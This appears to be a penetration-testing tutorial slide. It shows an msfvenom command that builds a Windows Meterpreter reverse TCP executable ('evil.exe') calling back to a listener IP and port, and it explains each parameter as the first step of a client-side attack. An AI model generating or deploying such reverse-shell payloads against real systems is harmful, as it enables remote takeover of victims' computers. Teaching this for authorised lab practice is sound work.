bash
# Generate a Windows Meterpreter reverse TCP executable
msfvenom -p windows/meterpreter/reverse_tcp \
           LHOST=192.168.1.100 \
           LPORT=4444 \
           -f exe \
           -o /root/Documents/evil.exe

# Replace 192.168.1.100 with your Kali Linux IP address.
# This command creates 'evil.exe' in the specified path.
Payload Parameters Explained
-p (Payload)

Specifies the type of payload to generate (e.g., `windows/meterpreter/reverse_tcp`).

LHOST (Local Host)

Your Kali Linux IP address, where the reverse connection will be caught.

LPORT (Local Port)

The port on your Kali machine that will listen for the incoming connection.

-f (Format) & -o (Output)

Defines the output file format (e.g., `exe`) and the output file path/name.

Generating Payloads with `msfvenom`

Crafting the Malicious Executable

`msfvenom` is Metasploit's powerful tool for creating custom payloads, essential for client-side attacks.

  • •Generates various payload types, including executables.
  • •Allows specifying local host (LHOST) and port (LPORT) for reverse connections.
  • •Outputs payloads in different formats (e.g., `exe`, `raw`).
Key Takeaway

A correctly configured `msfvenom` command is the first step to creating a functional client-side exploit payload.
